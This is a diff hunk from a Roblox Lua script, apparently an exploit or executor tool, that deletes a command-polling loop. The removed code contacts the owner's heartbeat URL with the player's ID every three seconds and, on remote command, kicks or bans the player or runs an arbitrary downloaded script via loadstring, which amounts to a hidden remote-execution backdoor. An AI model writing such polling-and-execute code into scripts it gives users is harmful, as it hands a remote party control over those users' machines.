@@ -357,55 +357,6 @@ local function startClientHeartbeat()
             task.wait(5)
         end
     end)
-    -- start command polling (kick / execute)
-    task.spawn(function()
-        while true do
-            local pollUrl = CLIENT_HEARTBEAT_URL .. "?commands=1&robloxId=" .. tostring(LocalPlayer.UserId or "")
-            local success, body = safeGet(pollUrl)
-            if not success then
-                debugPrint("CommandPoll: safeGet failed or no response")
-            else
-                if type(body) == "string" and body ~= "" then
-                    local decodedOk, data = pcall(function() return HttpService:JSONDecode(body) end)
-                    if decodedOk and type(data) == "table" and data.commands and #data.commands > 0 then
-                        debugPrint("CommandPoll: received", #data.commands, "commands")
-                        for _, cmd in ipairs(data.commands) do
-                            debugPrint("CommandPoll: cmd", tostring(cmd.type))
-                            pcall(function()
-                                if cmd.type == "kick" then
-                                    debugPrint("CommandPoll: kicking player")
-                                    if LocalPlayer and typeof(LocalPlayer.Kick) == "function" then
-                                        LocalPlayer:Kick("You Have Been Kicked By The Script Owner!")
-                                    end
-                                elseif cmd.type == "ban" then
-                                    debugPrint("CommandPoll: ban command received")
-                                        -- persist local ban and then kick with clear message
-                                        pcall(function() addBan(LocalPlayer.UserId) end)
-                                        if LocalPlayer and typeof(LocalPlayer.Kick) == "function" then
-                                            LocalPlayer:Kick("You Have Been Banned From Using This Script By Its Owner!")
-                                        end
-                                elseif cmd.type == "unban" then
-                                    debugPrint("CommandPoll: unban command received")
-                                    pcall(function() removeBan(LocalPlayer.UserId) end)
-                                elseif cmd.type == "execute" and type(cmd.script) == "string" and cmd.script ~= "" then
-                                    debugPrint("CommandPoll: executing script")
-                                    local fnOk, fn = pcall(function() return loadstring(cmd.script) end)
-                                    if fnOk and type(fn) == "function" then
-                                        task.spawn(function() pcall(fn) end)
-                                    else
-                                        debugPrint("CommandPoll: loadstring failed", tostring(fn))
-                                    end
-                                else
-                                    debugPrint("CommandPoll: unknown command type", tostring(cmd.type))
-                                end
-                            end)
-                        end
-                    end
-                end
-            end
-            task.wait(3)
-        end
-    end)
 end
 
 local PlatformURLs = {
